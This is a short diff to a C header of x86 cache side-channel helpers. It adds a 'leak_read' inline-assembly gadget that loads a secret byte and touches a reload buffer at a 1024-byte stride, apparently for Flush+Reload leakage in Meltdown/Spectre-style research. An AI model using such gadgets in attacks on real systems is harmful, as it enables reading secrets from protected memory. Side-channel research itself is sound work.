@@ -1,3 +1,5 @@
+#pragma once
+
 #include <inttypes.h>
 
 static inline __attribute__((always_inline)) void clflush(void* p) {
@@ -19,5 +21,15 @@ static inline __attribute__((always_inline)) void mfence() {
 }
 
 static inline __attribute__((always_inline)) void maccess(void *ptr) {
-    asm volatile("movq (%0), %%rax\n" : : "r"(ptr) : "rax");
+  asm volatile("movq (%0), %%rax\n" : : "r"(ptr) : "rax");
+}
+
+static inline __attribute__((always_inline)) void leak_read(void* leak_buffer, void* reload_buffer) {
+  asm volatile(
+    "movq (%0), %%rax\n"
+    "andq $0xff, %%rax\n"
+    "shlq $0xa, %%rax\n"
+    "movq (%1, %%rax), %%rax\n"
+    :: "r" (leak_buffer), "r" (reload_buffer) : "rax"
+  );
 }
